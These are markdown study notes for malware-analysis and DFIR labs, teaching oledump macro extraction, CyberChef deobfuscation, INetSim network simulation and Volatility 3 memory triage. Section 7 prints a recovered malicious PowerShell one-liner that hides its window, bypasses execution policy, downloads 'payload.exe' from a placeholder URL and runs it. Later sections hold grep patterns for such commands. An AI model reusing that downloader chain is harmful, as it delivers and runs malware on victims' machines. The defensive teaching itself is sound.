# OLEDump + INetSim + Volatility — Malware Analysis & Evidence Preprocessing

> Practical study notes for authorized malware-analysis and DFIR labs.

## ⚠️ Safety

Use suspicious documents, binaries, and memory images only in an isolated lab/VM. Do not execute unknown malware on a normal host or against real systems. The IPs, URLs, and payload names in the source material are lab indicators.

---

## 1. What This Lesson Covers

This workflow connects three areas:

```text
Suspicious Office File
        ↓
     OLEDump
        ↓
   VBA / Macro
        ↓
 Deobfuscation
        ↓
Behaviour hypothesis
   ┌────┴────┐
   ↓         ↓
INetSim   Volatility 3
   ↓         ↓
Network   Memory evidence
   └────┬────┘
        ↓
    Correlation
```

The core mindset is:

**Artifact → Evidence → Behaviour → Correlation → Conclusion**

---

# 2. OLE2 and OLEDump

## What is OLE2?

OLE2, also called Structured Storage / Compound File Binary Format (CFB), is a Microsoft container format capable of storing multiple streams and data types.

Think:

```text
Office container
├── metadata
├── streams
├── VBA project
│   ├── modules
│   ├── ThisWorkbook
│   └── project data
└── other embedded objects
```

This matters because an Office document can contain executable VBA code.

## What is oledump.py?

`oledump.py` is used to inspect OLE2 files and identify interesting streams, especially embedded VBA.

Start with:

```bash
oledump.py suspicious.xlsm
```

Example:

```text
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

The `A1`, `A2`, etc. values identify streams. A stream marked with `M` is a VBA macro stream.

### Analyst question

Don't stop at:

> “There is a macro.”

Ask:

> “What does the macro execute, download, modify, or launch?”

---

# 3. Inspecting a VBA Stream

If `A4` is interesting:

```bash
oledump.py suspicious.xlsm -s 4
```

Initially, the result may be a hex dump.

Look for recognizable strings such as:

```text
PowerShell
http://
https://
.exe
Start-Process
WebRequest
```

You do not need to understand every byte. Look for **behavioural clues**.

---

# 4. Decompressing VBA

VBA can be compressed. Use:

```bash
oledump.py suspicious.xlsm -s 4 --vbadecompress
```

This produces a much more readable representation of the macro.

Useful things to search for:

- PowerShell
- URLs/IP addresses
- executable names
- file paths
- process execution
- temporary files
- obfuscation functions
- `CreateObject`
- `Shell`
- download functions

---

# 5. Recognizing String Obfuscation

The source contains a pattern similar to:

```text
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l..."
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
```

Mental model:

```text
Obfuscated string
      ↓
Remove *
      ↓
Remove ^
      ↓
Actual PowerShell command
```

This is a classic analyst clue:

> If a suspicious string looks unreadable, inspect the code that transforms it.

---

# 6. CyberChef Deobfuscation

For simple character replacement, CyberChef can reproduce the transformation.

Use two **Find/Replace** operations:

```text
Find: *
Replace: [empty]
Mode: Simple String
```

then:

```text
Find: ^
Replace: [empty]
Mode: Simple String
```

The goal is to understand the transformation, not just obtain readable text.

---

# 7. Understanding the Recovered PowerShell

The source reconstructs a command with this general behaviour:

```powershell
powershell -WindowStyle hidden -ExecutionPolicy Bypass;
$TempFile = [IO.Path]::GetTempFileName() |
    Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru;
Invoke-WebRequest -Uri "<URL>/payload.exe" -OutFile $TempFile;
Start-Process $TempFile;
```

Break it down:

### `-WindowStyle hidden`

Attempts to hide the PowerShell window.

### `-ExecutionPolicy Bypass`

Requests bypassing normal PowerShell execution-policy restrictions.

### `GetTempFileName()`

Creates a temporary filename.

### `Rename-Item`

Changes the temporary file's extension/name.

### `Invoke-WebRequest`

Makes a web request and can retrieve remote content.

### `-Uri`

Specifies the remote resource.

### `-OutFile`

Specifies where the retrieved content is written.

### `Start-Process`

Starts the resulting file/process.

### Behaviour chain

```text
Office macro
   ↓
PowerShell
   ↓
Hidden execution
   ↓
Download
   ↓
Save locally
   ↓
Execute
```

This is much more valuable than simply reporting “macro found.”

---

# 8. Static vs Dynamic Analysis

## Static

Inspect without executing the suspicious artifact.

Examples:

```text
OLEDump
strings
YARA
CAPA
hashing
metadata
VBA extraction
```

Questions:

- What is inside?
- Are macros present?
- What commands exist?
- Are there URLs?
- What files might be created?

## Dynamic

Observe behaviour in a controlled environment.

Examples:

```text
INetSim
Wireshark
Procmon
Process Explorer
Sysmon
sandboxing
```

Questions:

- What network requests occur?
- What processes start?
- What files are created?
- What DNS requests appear?

---

# 9. INetSim

**INetSim = Internet Services Simulation Suite**

It provides simulated network services for malware-analysis environments.

Instead of:

```text
Malware → Real Internet
```

you can build:

```text
Sample → Isolated Lab → INetSim → Fake service responses
```

This allows network behaviour to be observed without connecting the sample to a real malicious infrastructure.

---

# 10. INetSim Configuration

The source uses:

```bash
sudo nano /etc/inetsim/inetsim.conf
```

and configures:

```text
dns_default_ip
```

The correct value depends on the isolated lab's network.

Verify it with:

```bash
cat /etc/inetsim/inetsim.conf | grep dns_default_ip
```

Start:

```bash
sudo inetsim
```

A successful run should show:

```text
Simulation running.
```

Some individual services may fail because of configuration or port conflicts; investigate those separately rather than assuming the whole simulation failed.

---

# 11. Observing Simulated Downloads

A controlled lab can request a fake resource from INetSim, for example:

```bash
wget https://<LAB_IP>/sample_payload --no-check-certificate
```

The important concept is:

```text
Client request
      ↓
INetSim
      ↓
Fake response/file
      ↓
Local evidence
```

The returned file is a simulation artifact, not automatically a real malicious payload.

---

# 12. INetSim Connection Reports

INetSim writes reports under:

```text
/var/log/inetsim/report/
```

A report can record:

- timestamps
- protocol
- HTTP method
- URL
- requested path
- served file

Example structure:

```text
HTTPS connection
method: GET
URL: https://<LAB_IP>/...
file name: /var/lib/inetsim/http/fakefiles/...
```

Think:

```text
WHO?    Which process/client?
WHEN?   What time?
WHERE?  Which destination?
WHAT?   Which URL/resource?
HOW?    Which protocol/method?
RESULT? What was returned?
```

---

# 13. Volatility 3

Memory is volatile evidence. A memory image may contain:

- running processes
- process relationships
- command lines
- loaded DLLs
- file objects
- suspicious memory regions

Basic form:

```bash
vol3 -f memory.mem windows.<plugin>
```

---

# 14. Important Windows Plugins

| Plugin | Purpose |
|---|---|
| `windows.pstree.PsTree` | Parent/child process tree |
| `windows.pslist.PsList` | Active process listing |
| `windows.cmdline.CmdLine` | Process command-line arguments |
| `windows.filescan.FileScan` | Scan memory for file objects |
| `windows.dlllist.DllList` | Loaded DLL/modules |
| `windows.psscan.PsScan` | Scan memory for process structures |
| `windows.malfind.Malfind` | Potential injected/suspicious memory |

## PsTree

```bash
vol3 -f memory.mem windows.pstree.PsTree
```

Think:

```text
explorer.exe
 └── suspicious.exe
      └── powershell.exe
```

Parent-child relationships can reveal execution chains.

## PsList

```bash
vol3 -f memory.mem windows.pslist.PsList
```

Lists process evidence.

## CmdLine

```bash
vol3 -f memory.mem windows.cmdline.CmdLine
```

Command-line arguments provide context that process names alone cannot.

## FileScan

```bash
vol3 -f memory.mem windows.filescan.FileScan
```

Searches memory for file objects. Output can be very large.

## DllList

```bash
vol3 -f memory.mem windows.dlllist.DllList
```

Lists modules/DLLs associated with processes.

## PsScan

```bash
vol3 -f memory.mem windows.psscan.PsScan
```

Scans memory for process structures. Comparing it with `PsList` can reveal useful discrepancies.

## Malfind

```bash
vol3 -f memory.mem windows.malfind.Malfind
```

Identifies memory ranges that may contain injected/suspicious code.

**Important:** `malfind` is a lead, not automatic proof of malware.

---

# 15. Evidence Preprocessing

A major DFIR lesson is:

> Preprocess evidence once so analysts can search and investigate it repeatedly.

Instead of rerunning every plugin manually, save results:

```text
memory
 ↓
Volatility plugins
 ↓
TXT/JSON artefacts
 ↓
Fast searching and correlation
```

---

# 16. Batch Volatility Processing

A shell loop can run multiple plugins:

```bash
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList
do
    vol3 -q -f memory.mem $plugin > output.$plugin.txt
done
```

### Breakdown

`$plugin`

```text
Current plugin name
```

`-q`

```text
Quiet mode
```

`-f`

```text
Input memory image
```

`>`

```text
Redirect output into a file
```

Result:

```text
output.windows.malfind.Malfind.txt
output.windows.psscan.PsScan.txt
...
```

The exact filenames can be changed to suit your case-management convention.

---

# 17. Strings Preprocessing

Extract ASCII:

```bash
strings memory.mem > memory.strings.ascii.txt
```

Extract 16-bit little-endian strings:

```bash
strings -e l memory.mem > memory.strings.unicode_little_endian.txt
```

Extract 16-bit big-endian strings:

```bash
strings -e b memory.mem > memory.strings.unicode_big_endian.txt
```

Why all three?

Windows evidence often contains Unicode strings, so searching only ASCII can miss useful indicators.

---

# 18. Searching Preprocessed Results

Examples:

```bash
grep -i "powershell" memory.strings.ascii.txt
```

```bash
grep -Ei "https?://|www\." memory.strings.ascii.txt
```

```bash
grep -Ei "\.exe|\.dll|\.ps1|\.bat|\.cmd" memory.strings.ascii.txt
```

```bash
grep -Ei "invoke-webrequest|start-process|download" memory.strings.ascii.txt
```

These are **search leads**, not conclusions. Always validate hits in context.

---

# 19. Full Investigation Workflow

```text
Suspicious Office File
        ↓
Hash / identify
        ↓
OLEDump
        ↓
Find VBA
        ↓
Decompress VBA
        ↓
Identify commands and obfuscation
        ↓
Deobfuscate
        ↓
Build behaviour hypothesis
        ↓
Controlled dynamic analysis
        ↓
INetSim network evidence
        ↓
Memory capture
        ↓
Volatility 3
        ↓
Preprocess outputs
        ↓
Strings + grep
        ↓
Correlate all evidence
        ↓
Document conclusion
```

---

# 20. Evidence Correlation

| Evidence | Finding | Interpretation |
|---|---|---|
| OLE stream | VBA present | Possible execution mechanism |
| VBA | PowerShell | Script interpreter involved |
| Deobfuscation | Download command | Possible payload retrieval |
| INetSim | GET request | Network behaviour observed |
| Process tree | Child process | Execution relationship |
| CmdLine | PowerShell arguments | Execution context |
| DLL list | Unusual module | Investigation lead |
| Malfind | Suspicious region | Possible injection lead |
| Strings | URL/file/process strings | Additional indicators |

The power comes from **correlation**, not one tool alone.

---

# 21. Indicators to Extract

## File

```text
Filename
SHA-256
File type
File size
OLE streams
VBA modules
```

## Network

```text
IP addresses
Domains
URLs
Ports
Protocols
HTTP methods
Requested paths
Downloaded filenames
Timestamps
```

## Execution

```text
PowerShell
cmd.exe
wscript.exe
cscript.exe
rundll32.exe
regsvr32.exe
mshta.exe
```

## Memory

```text
Process name
PID
Parent PID
Command line
DLL/module path
Suspicious memory region
File object
```

---

# 22. Common Mistakes

### 1. Executing first

Better:

```text
Hash
→ Identify
→ Extract
→ Static analysis
→ Controlled dynamic analysis
```

### 2. Assuming every macro is malicious

A macro is an execution mechanism. Investigate what it actually does.

### 3. Treating `malfind` as proof

It is an investigative lead.

### 4. Searching only ASCII

Also inspect Unicode.

### 5. Investigating tools independently

Correlate:

```text
OLEDump + INetSim + Volatility
```

---

# 23. Analyst Checklist

## Office

- [ ] Hash sample
- [ ] Identify file type
- [ ] Enumerate OLE streams
- [ ] Identify VBA streams
- [ ] Decompress VBA
- [ ] Search for PowerShell
- [ ] Search for URLs/IPs
- [ ] Identify obfuscation
- [ ] Deobfuscate safely
- [ ] Document behaviour

## Network

- [ ] Isolate environment
- [ ] Configure simulation
- [ ] Start INetSim
- [ ] Record DNS/HTTP/HTTPS activity
- [ ] Record timestamps
- [ ] Record requested resources
- [ ] Save reports

## Memory

- [ ] Preserve original image
- [ ] Run PsTree
- [ ] Run PsList
- [ ] Run CmdLine
- [ ] Run FileScan
- [ ] Run DllList
- [ ] Run PsScan
- [ ] Run Malfind
- [ ] Export results
- [ ] Extract ASCII/Unicode strings
- [ ] Search indicators
- [ ] Correlate evidence

---

# 24. Personal Investigation Template

```text
# Sample Investigation

## File
Name:
SHA-256:
Type:
Size:

## OLE Analysis
VBA present:
Interesting stream:
Modules:

## Macro
Execution trigger:
Obfuscation:
Commands:
URLs:
IPs:
Files:

## Network
Destination:
Protocol:
Method:
Timestamp:
Requested resource:
Response:

## Memory
Process:
PID:
Parent PID:
Command line:
DLL:
Malfind:
Interesting strings:

## Timeline
T+00:
T+01:
T+02:
T+03:

## Hypothesis
What happened?

## Supporting Evidence
1.
2.
3.

## Limitations
What is confirmed?
What is only a lead?
What evidence is missing?
```

---

# 25. What to Learn Next

After mastering this workflow, continue with:

```text
VBA analysis
→ VBA stomping
→ PowerShell logging
→ AMSI
→ Sysmon
→ Windows Event Logs
→ YARA
→ Sigma
→ MITRE ATT&CK
→ Wireshark
→ Zeek
→ Advanced Volatility
→ Malware timelines
→ Detection engineering
```

---

# 26. Final Mental Model

Remember:

```text
DOCUMENT
   ↓
OLEDUMP
   ↓
MACRO
   ↓
DEOBFUSCATION
   ↓
BEHAVIOUR
   ↓
NETWORK
   ↓
MEMORY
   ↓
PREPROCESSING
   ↓
CORRELATION
   ↓
INVESTIGATION
```

The goal is not to memorize commands.

The goal is to learn to turn raw artifacts into defensible evidence:

> **Artifact → Evidence → Behaviour → Correlation → Conclusion**
